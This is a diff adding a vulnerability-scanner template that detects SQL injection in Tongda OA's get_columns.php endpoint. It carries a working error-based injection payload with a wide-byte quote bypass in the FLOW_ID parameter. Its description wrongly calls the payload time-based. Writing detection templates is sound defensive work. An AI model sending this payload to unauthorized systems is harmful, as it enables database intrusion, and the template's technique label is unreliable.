@@ -1,0 +1,26 @@
+id: poc-yaml-tongda-oa-list-get-columns-sqli
+info:
+  name: 通达OA /list/get_columns.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in 通达OA's /list/get_columns.php endpoint by leveraging a time-based payload.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/general/workflow/list/get_columns.php?FLOW_ID=11%BF%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5({{t1}}),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Duplicate entry"
+      - type: word
+        words:
+          - "{{t2}}"
